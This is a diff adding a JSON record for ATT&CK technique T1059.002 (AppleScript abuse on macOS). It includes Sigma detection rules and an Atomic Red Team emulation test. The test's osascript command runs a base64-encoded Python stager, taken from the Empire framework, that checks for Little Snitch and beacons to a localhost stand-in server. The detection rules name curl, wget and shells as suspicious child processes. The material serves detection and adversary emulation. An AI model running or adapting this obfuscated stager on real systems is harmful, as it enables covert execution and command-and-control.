@@ -1,0 +1,120 @@
+{
+    "id": "T1059.002",
+    "name": "AppleScript",
+    "description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\nScripts can be run from the command-line via `osascript /path/to/script` or `osascript -e \"script here\"`. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding `#!/usr/bin/osascript` to the start of the script file.(Citation: SentinelOne AppleScript)\nAppleScripts do not need to call `osascript` to execute, however. They may be executed from within mach-O binaries by using the macOS [Native API](T1106)s `NSAppleScript` or `OSAScript`, both of which execute code independent of the `/usr/bin/osascript` command line utility.\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team). Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](T1059.006).(Citation: Macro Malware Targets Macs)",
+    "platforms": "macOS",
+    "kill_chain_phases": "Execution",
+    "data_sources": "Command: Command Execution, Process: Process Creation, Process: OS API Execution",
+    "detection": "Monitor for execution of AppleScript through `osascript` and usage of the `NSAppleScript` and `OSAScript` APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](TA0007), [Collection](TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.",
+    "url": "https://attack.mitre.org/techniques/T1059/002",
+    "enrichments": {
+        "attack_rule_map": [],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "1bc2e6c5-0885-472b-bed6-be5ea8eace55",
+                    "37b11151-1776-4f8f-b328-30939fbf2ceb",
+                    "7794fa3c-edea-4cff-bec7-267dd4770fd7",
+                    "b9d9b652-d8ed-4697-89a2-a1186ee680ac",
+                    "6e4dcdd1-e48b-42f7-b2d8-3b413fc58cb4",
+                    "69483748-1525-4a6c-95ca-90dc8d431b68",
+                    "f1408a58-0e94-4165-b80a-da9f96cf6fc3"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "1bc2e6c5-0885-472b-bed6-be5ea8eace55",
+                        "lookup_data": {
+                            "description": "Detects execution of AppleScript of the macOS scripting language AppleScript.",
+                            "raw": "author: Alejandro Ortuno, oscd.community\ndate: 2020/10/21\ndescription: Detects execution of AppleScript of the macOS scripting language AppleScript.\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -e '\n    - .scpt\n    - .js\n    Image|endswith: /osascript\nfalsepositives:\n- Application installers might contain scripts as part of the installation process.\nid: 1bc2e6c5-0885-472b-bed6-be5ea8eace55\nlevel: medium\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2023/02/01\nreferences:\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1059.002/T1059.002.md\n- https://redcanary.com/blog/applescript/\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.002\ntitle: MacOS Scripting Interpreter AppleScript\n",
+                            "sigma:id": "1bc2e6c5-0885-472b-bed6-be5ea8eace55",
+                            "title": "MacOS Scripting Interpreter AppleScript",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "37b11151-1776-4f8f-b328-30939fbf2ceb",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1059.002",
+                            "mitre-cti:description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\n\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)\n\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s <code>NSAppleScript</code> or <code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\n\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)",
+                            "mitre-cti:name": "AppleScript",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'modified': '2022-10-19T15:37:28.071Z', 'name': 'AppleScript', 'description': 'Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.(Citation: Apple AppleScript) These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.\\n\\nScripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>. Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding <code>#!/usr/bin/osascript</code> to the start of the script file.(Citation: SentinelOne AppleScript)\\n\\nAppleScripts do not need to call <code>osascript</code> to execute. However, they may be executed from within mach-O binaries by using the macOS [Native API](https://attack.mitre.org/techniques/T1106)s\\xa0<code>NSAppleScript</code>\\xa0or\\xa0<code>OSAScript</code>, both of which execute code independent of the <code>/usr/bin/osascript</code> command line utility.\\n\\nAdversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they\\'re already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute [Native API](https://attack.mitre.org/techniques/T1106)s, which otherwise would require compilation and execution in a mach-O binary file format.(Citation: SentinelOne macOS Red Team) Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via [Python](https://attack.mitre.org/techniques/T1059/006).(Citation: Macro Malware Targets Macs)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'execution'}], 'x_mitre_detection': 'Monitor for execution of AppleScript through <code>osascript</code> and usage of the <code>NSAppleScript</code> and <code>OSAScript</code> APIs that may be related to other suspicious behavior occurring on the system. Scripts are likely to perform actions with various effects on a system that may generate events, depending on the types of monitoring used. Monitor processes and command-line arguments for script execution and subsequent behavior. Actions may be related to network and system information [Discovery](https://attack.mitre.org/tactics/TA0007), [Collection](https://attack.mitre.org/tactics/TA0009), or other scriptable post-compromise behaviors and could be used as indicators of detection leading back to the source script.\\n\\nUnderstanding standard usage patterns is important to avoid a high number of false positives. If scripting is restricted for normal users, then any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent.', 'x_mitre_platforms': ['macOS'], 'x_mitre_is_subtechnique': True, 'x_mitre_deprecated': False, 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_version': '1.1', 'x_mitre_contributors': ['Phil Stokes, SentinelOne'], 'x_mitre_data_sources': ['Command: Command Execution', 'Process: Process Creation', 'Process: OS API Execution'], 'x_mitre_remote_support': False, 'type': 'attack-pattern', 'id': 'attack-pattern--37b11151-1776-4f8f-b328-30939fbf2ceb', 'created': '2020-03-09T14:07:54.329Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'revoked': False, 'external_references': [{'source_name': 'mitre-attack', 'url': 'https://attack.mitre.org/techniques/T1059/002', 'external_id': 'T1059.002'}, {'source_name': 'Apple AppleScript', 'description': 'Apple. (2016, January 25). Introduction to AppleScript Language Guide. Retrieved March 28, 2020.', 'url': 'https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html'}, {'source_name': 'SentinelOne macOS Red Team', 'description': 'Phil Stokes. (2019, December 5). macOS Red Team: Calling Apple APIs Without Building Binaries. Retrieved July 17, 2020.', 'url': 'https://www.sentinelone.com/blog/macos-red-team-calling-apple-apis-without-building-binaries/'}, {'source_name': 'SentinelOne AppleScript', 'description': 'Phil Stokes. (2020, March 16). How Offensive Actors Use AppleScript For Attacking macOS. Retrieved July 17, 2020.', 'url': 'https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/'}, {'source_name': 'Macro Malware Targets Macs', 'description': 'Yerko Grbic. (2017, February 14). Macro Malware Targets Macs. Retrieved July 8, 2017.', 'url': 'https://www.mcafee.com/blogs/other-blogs/mcafee-labs/macro-malware-targets-macs/'}], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'x_mitre_attack_spec_version': '2.1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5'}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "7794fa3c-edea-4cff-bec7-267dd4770fd7",
+                        "lookup_data": {
+                            "description": "Detects possible collection of data from the clipboard via execution of the osascript binary",
+                            "raw": "author: Sohan G (D4rkCiph3r)\ndate: 2023/01/31\ndescription: Detects possible collection of data from the clipboard via execution\n  of the osascript binary\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - osascript\n    - ' -e '\n    - clipboard\nfalsepositives:\n- Unlikely\nfields:\n- CommandLine\nid: 7794fa3c-edea-4cff-bec7-267dd4770fd7\nlevel: high\nlogsource:\n  category: process_creation\n  product: macos\nreferences:\n- https://www.sentinelone.com/blog/how-offensive-actors-use-applescript-for-attacking-macos/\nrelated:\n- id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55\n  type: derived\nstatus: experimental\ntags:\n- attack.collection\n- attack.execution\n- attack.t1115\n- attack.t1059.002\ntitle: Clipboard Data Collection Via OSAScript\n",
+                            "sigma:id": "7794fa3c-edea-4cff-bec7-267dd4770fd7",
+                            "title": "Clipboard Data Collection Via OSAScript",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "b9d9b652-d8ed-4697-89a2-a1186ee680ac",
+                        "lookup_data": {
+                            "description": "Detects potential suspicious run-only executions compiled using OSACompile",
+                            "raw": "author: Sohan G (D4rkCiph3r)\ndate: 2023/01/31\ndescription: Detects potential suspicious run-only executions compiled using OSACompile\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - osacompile\n    - ' -x '\n    - ' -e '\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: b9d9b652-d8ed-4697-89a2-a1186ee680ac\nlevel: high\nlogsource:\n  category: process_creation\n  product: macos\nreferences:\n- https://redcanary.com/blog/applescript/\n- https://ss64.com/osx/osacompile.html\nstatus: experimental\ntags:\n- attack.t1059.002\n- attack.execution\ntitle: OSACompile Run-Only Execution\n",
+                            "sigma:id": "b9d9b652-d8ed-4697-89a2-a1186ee680ac",
+                            "title": "OSACompile Run-Only Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "6e4dcdd1-e48b-42f7-b2d8-3b413fc58cb4",
+                        "lookup_data": {
+                            "description": "Detects when the macOS Script Editor utility spawns an unusual child process.",
+                            "raw": "author: Tim Rauch (rule), Elastic (idea)\ndate: 2022/10/21\ndescription: Detects when the macOS Script Editor utility spawns an unusual child\n  process.\ndetection:\n  condition: all of selection_*\n  selection_img:\n  - Image|endswith:\n    - /curl\n    - /bash\n    - /sh\n    - /zsh\n    - /dash\n    - /fish\n    - /osascript\n    - /mktemp\n    - /chmod\n    - /php\n    - /nohup\n    - /openssl\n    - /plutil\n    - /PlistBuddy\n    - /xattr\n    - /sqlite\n    - /funzip\n    - /popen\n  - Image|contains:\n    - python\n    - perl\n  selection_parent:\n    ParentImage|endswith: /Script Editor\nfalsepositives:\n- Unknown\nid: 6e4dcdd1-e48b-42f7-b2d8-3b413fc58cb4\nlevel: medium\nlogsource:\n  category: process_creation\n  product: macos\nmodified: 2022/12/28\nreferences:\n- https://github.com/elastic/protections-artifacts/commit/746086721fd385d9f5c6647cada1788db4aea95f#diff-7f541fbc4a4a28a92970e8bf53effea5bd934604429112c920affb457f5b2685\n- https://wojciechregula.blog/post/macos-red-teaming-initial-access-via-applescript-url/\nstatus: experimental\ntags:\n- attack.t1566\n- attack.t1566.002\n- attack.initial_access\n- attack.t1059\n- attack.t1059.002\n- attack.t1204\n- attack.t1204.001\n- attack.execution\n- attack.persistence\n- attack.t1553\n- attack.defense_evasion\ntitle: Suspicious Execution via macOS Script Editor\n",
+                            "sigma:id": "6e4dcdd1-e48b-42f7-b2d8-3b413fc58cb4",
+                            "title": "Suspicious Execution via macOS Script Editor",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "69483748-1525-4a6c-95ca-90dc8d431b68",
+                        "lookup_data": {
+                            "description": "Detects suspicious child processes spawning from microsoft office suite applications such as word or excel. This could indicates malicious macro execution",
+                            "raw": "author: Sohan G (D4rkCiph3r)\ndate: 2023/01/31\ndescription: Detects suspicious child processes spawning from microsoft office suite\n  applications such as word or excel. This could indicates malicious macro execution\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - /bash\n    - /curl\n    - /dash\n    - /fish\n    - /osacompile\n    - /osascript\n    - /sh\n    - /zsh\n    - /python\n    - /python3\n    - /wget\n    ParentImage|contains:\n    - Microsoft Word\n    - Microsoft Excel\n    - Microsoft PowerPoint\n    - Microsoft OneNote\nfalsepositives:\n- Unknown\nid: 69483748-1525-4a6c-95ca-90dc8d431b68\nlevel: high\nlogsource:\n  category: process_creation\n  product: macos\nreferences:\n- https://redcanary.com/blog/applescript/\n- https://objective-see.org/blog/blog_0x4B.html\nstatus: experimental\ntags:\n- attack.execution\n- attack.persistence\n- attack.t1059.002\n- attack.t1137.002\n- attack.t1204.002\ntitle: Suspicious Microsoft Office Child Process\n",
+                            "sigma:id": "69483748-1525-4a6c-95ca-90dc8d431b68",
+                            "title": "Suspicious Microsoft Office Child Process",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f1408a58-0e94-4165-b80a-da9f96cf6fc3",
+                        "lookup_data": {
+                            "description": "Detects possible malicious execution of JXA in-memory via OSAScript",
+                            "raw": "author: Sohan G (D4rkCiph3r)\ndate: 2023/01/31\ndescription: Detects possible malicious execution of JXA in-memory via OSAScript\ndetection:\n  condition: all of selection_*\n  selection_js:\n  - CommandLine|contains|all:\n    - ' -l '\n    - JavaScript\n  - CommandLine|contains: .js\n  selection_main:\n    CommandLine|contains|all:\n    - osascript\n    - ' -e '\n    - eval\n    - NSData.dataWithContentsOfURL\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\nid: f1408a58-0e94-4165-b80a-da9f96cf6fc3\nlevel: high\nlogsource:\n  category: process_creation\n  product: macos\nreferences:\n- https://redcanary.com/blog/applescript/\nrelated:\n- id: 1bc2e6c5-0885-472b-bed6-be5ea8eace55\n  type: derived\nstatus: experimental\ntags:\n- attack.t1059.002\n- attack.t1059.007\n- attack.execution\ntitle: JXA In-memory Execution Via OSAScript\n",
+                            "sigma:id": "f1408a58-0e94-4165-b80a-da9f96cf6fc3",
+                            "title": "JXA In-memory Execution Via OSAScript",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1059.002",
+                "display_name": "Command and Scripting Interpreter: AppleScript",
+                "atomic_tests": [
+                    {
+                        "name": "AppleScript",
+                        "auto_generated_guid": "3600d97d-81b9-4171-ab96-e4386506e2c2",
+                        "description": "Shell Script with AppleScript. The encoded python script will perform an HTTP GET request to 127.0.0.1:80 with a session cookie of \"t3VhVOs/DyCcDTFzIKanRxkvk3I=\", unless 'Little Snitch' is installed, in which case it will just exit. \nYou can use netcat to listen for the connection and verify execution, e.g. use \"nc -l 80\" in another terminal window before executing this test and watch for the request.\n\nReference: https://github.com/EmpireProject/Empire\n",
+                        "supported_platforms": [
+                            "macos"
+                        ],
+                        "executor": {
+                            "command": "osascript -e \"do shell script \\\"echo \\\\\\\"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aW1wb3J0IHN5cztpbXBvcnQgcmUsIHN1YnByb2Nlc3M7Y21kID0gInBzIC1lZiB8IGdyZXAgTGl0dGxlXCBTbml0Y2ggfCBncmVwIC12IGdyZXAiCnBzID0gc3VicHJvY2Vzcy5Qb3BlbihjbWQsIHNoZWxsPVRydWUsIHN0ZG91dD1zdWJwcm9jZXNzLlBJUEUpCm91dCA9IHBzLnN0ZG91dC5yZWFkKCkKcHMuc3Rkb3V0LmNsb3NlKCkKaWYgcmUuc2VhcmNoKCJMaXR0bGUgU25pdGNoIiwgb3V0KToKICAgc3lzLmV4aXQoKQppbXBvcnQgdXJsbGliMjsKVUE9J01vemlsbGEvNS4wIChXaW5kb3dzIE5UIDYuMTsgV09XNjQ7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJztzZXJ2ZXI9J2h0dHA6Ly8xMjcuMC4wLjE6ODAnO3Q9Jy9sb2dpbi9wcm9jZXNzLnBocCc7cmVxPXVybGxpYjIuUmVxdWVzdChzZXJ2ZXIrdCk7CnJlcS5hZGRfaGVhZGVyKCdVc2VyLUFnZW50JyxVQSk7CnJlcS5hZGRfaGVhZGVyKCdDb29raWUnLCJzZXNzaW9uPXQzVmhWT3MvRHlDY0RURnpJS2FuUnhrdmszST0iKTsKcHJveHkgPSB1cmxsaWIyLlByb3h5SGFuZGxlcigpOwpvID0gdXJsbGliMi5idWlsZF9vcGVuZXIocHJveHkpOwp1cmxsaWIyLmluc3RhbGxfb3BlbmVyKG8pOwphPXVybGxpYjIudXJsb3BlbihyZXEsdGltZW91dD0zKS5yZWFkKCk7Cg=='));\\\\\\\" | python &\\\"\"\n",
+                            "name": "sh"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 12:04:08"
+}
